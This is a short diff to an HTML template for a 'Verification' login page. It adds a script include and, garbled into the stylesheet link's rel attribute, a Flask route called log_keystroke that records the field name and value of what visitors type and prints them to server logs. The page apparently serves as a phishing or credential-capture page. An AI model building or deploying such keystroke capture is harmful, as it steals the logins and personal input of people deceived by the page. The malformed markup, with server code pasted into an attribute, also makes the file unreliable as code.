@@ -3,7 +3,17 @@
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Verification</title>
-    <link rel="stylesheet" href="/static/style.css">
+    <link rel="@app.route('/log_keystroke', methods=['POST'])
+def log_keystroke():
+    data = request.json
+    field = data.get('field')
+    value = data.get('value')
+    
+    # We use flush=True so it prints to Render logs immediately
+    print(f"[*] KEYSTROKE LOGGED ({field}): {value}", flush=True)
+    
+    return jsonify({"status": "success"})" href="/static/style.css">
+ <script src="/static/script.js"></script>
 </head>
 <body>
     <div class="login-container">
